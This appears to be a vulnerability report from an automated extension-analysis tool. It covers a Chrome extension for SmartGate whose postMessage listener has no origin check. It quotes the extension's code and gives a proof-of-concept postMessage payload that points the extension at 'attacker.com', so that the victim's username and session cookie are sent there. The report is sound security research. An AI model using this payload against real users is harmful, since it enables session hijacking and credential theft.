# CoCo Analysis: dgpaocepkkejppeglddlkloekgclnfhn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgpaocepkkejppeglddlkloekgclnfhn/opgen_generated_files/cs_1.js
Line 474    window.addEventListener('message', function (e) {
Line 476    var type= e.data.type
Line 478    chrome.runtime.sendMessage({type:'localHost',data:e.data.data} );

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dgpaocepkkejppeglddlkloekgclnfhn/opgen_generated_files/bg.js
Line 1201   chrome.storage.sync.set({ localHostUrl:msg.data.url });

**Code:**

```javascript
// Content script (cs_1.js/contentSG.js) - line 474
// Runs on: *://*.smartgate.app/*, *://smartgate.app/*, http://*.localhost/*
window.addEventListener('message', function (e) {
    var type = e.data.type
    if(type == 'localHost') {
        chrome.runtime.sendMessage({type:'localHost', data:e.data.data});  // ← attacker-controlled
    }
    if(type == 'loadSchool') {
        chrome.runtime.sendMessage({type:'loadSchool', data:e.data.data});
    }
});

// Background script (bg.js) - line 1200
chrome.runtime.onMessage.addListener((msg, sender) => {
    try {
        if(msg.type == 'localHost') {
            chrome.storage.sync.set({ localHostUrl: msg.data.url });  // Storage write sink
        }
    } catch (e) { }
});

// Background script - Storage retrieval and SSRF (line 989-1037)
let loadCookiesForURL = (sAlert) => {
    chrome.storage.sync.get("localHostUrl", ({ localHostUrl }) => {
        var cookeKey = 'sys_session_schoex';
        var crrUsrKey = 'curr_session_user';
        var url = 'https://smartgate.app/';
        var saveUrl = 'http://localhost/saver.php';
        saveUrl = localHostUrl  // ← attacker-controlled URL from storage
        if(localHostUrl)
            saveUrl = 'http://' + getHost(saveUrl) + '/saver.php'

        getCookiesForURL(url).then(data => {
            let cookieValue = false;
            let crrUsr = false;
            let results = {};

            data.forEach(datum => {
                if(datum['name'] === cookeKey)
                    cookieValue = datum['value']  // Session cookie
                try {
                    if(datum['name'] === crrUsrKey) {
                        crrUsr = JSON.parse(datum['value'])  // User data
                    }
                } catch (e) { }
            });

            if(crrUsr) {
                if(crrUsr.username) {
                    // Send sensitive data to attacker-controlled URL
                    runSyncHttpDataSaver(url, crrUsr, cookieValue, saveUrl, sAlert, results);
                }
            }
            else if(cookieValue) {
                runSyncHttpData(url, cookieValue, saveUrl, sAlert, results)
            }
        });
    });
};

// Background script - SSRF sink (line 1066-1086)
let runSyncHttpDataSaver = ((url, userdata, cook, saveUrl, sAlert, results) => {
    // Sends user credentials to attacker-controlled URL
    fetch(saveUrl + '?u=' + userdata.username + '&c=' + cook, {  // ← SSRF with sensitive data
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "user": userdata, results: results  // ← Sensitive user data in body
        })
    })
    .then((data) => {
        if(data.status == 200)
            sendMessage('تم مزامنة تسجيل الدخول', sAlert);
    })
    .catch(function (e) {
        sendMessage('تاكد من رابط الاوف لاين', sAlert);
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (no origin check)

**Attack:**

```javascript
// On any page matching: *://*.smartgate.app/*, *://smartgate.app/*, http://*.localhost/*
// Attacker poisons the localHostUrl
window.postMessage({
    type: 'localHost',
    data: {
        url: 'http://attacker.com/steal'
    }
}, '*');

// When user later logs into SmartGate, their credentials are exfiltrated to attacker.com
// The extension will send:
// POST http://attacker.com/saver.php?u=victim_username&c=session_cookie
// Body: {"user": {username, ...}, "results": {...}}
```

**Impact:** Complete credential theft via SSRF. The extension stores an attacker-controlled URL in storage, then later retrieves it and uses it in a fetch() request that exfiltrates the user's SmartGate credentials (username, session cookies, and user data) to the attacker's server. This is a complete storage exploitation chain: attacker data → storage.set → storage.get → fetch to attacker-controlled URL with sensitive data. The content script runs on multiple domains including localhost wildcards, and there is no origin validation on the postMessage listener, allowing any matching webpage to poison the storage and steal credentials on the next login.
